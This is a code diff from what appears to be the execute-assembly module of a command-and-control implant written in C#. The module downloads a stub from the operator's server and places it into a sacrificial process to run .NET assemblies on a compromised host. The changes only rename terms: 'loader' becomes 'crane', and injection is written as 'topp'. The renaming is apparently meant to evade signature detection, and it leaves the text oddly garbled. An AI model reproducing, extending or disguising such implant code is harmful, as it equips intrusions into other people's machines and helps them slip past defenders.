@@ -54,8 +54,8 @@ namespace Tasks
             public string AssemblyId;
             [DataMember(Name = "assembly_arguments")]
             public string AssemblyArguments;
-            [DataMember(Name = "loader_stub_id")]
-            public string LoaderStubId;
+            [DataMember(Name = "crane_stub_id")]
+            public string craneStubId;
         }
 
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
@@ -162,7 +162,7 @@ namespace Tasks
             try
             {
                 ExecuteAssemblyParameters parameters = _jsonSerializer.Deserialize<ExecuteAssemblyParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
+                if (string.IsNullOrEmpty(parameters.craneStubId) ||
                     string.IsNullOrEmpty(parameters.AssemblyName) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
@@ -182,9 +182,9 @@ namespace Tasks
                     }
                 }
 
-                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
+                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.craneStubId, out byte[] exeAsmPic))
                 {
-                    throw new ExecuteAssemblyException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})");
+                    throw new ExecuteAssemblyException($"Failed to download assembly crane stub (with id: {parameters.craneStubId})");
                 }
 
                 ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
@@ -217,7 +217,7 @@ namespace Tasks
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "topping stub..."));
                 if (!proc.topp(exeAsmPic))
                 {
-                    throw new ExecuteAssemblyException($"Failed to topp assembly loader into sacrificial process {info.Application}.");
+                    throw new ExecuteAssemblyException($"Failed to topp assembly crane into sacrificial process {info.Application}.");
                 }
 
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
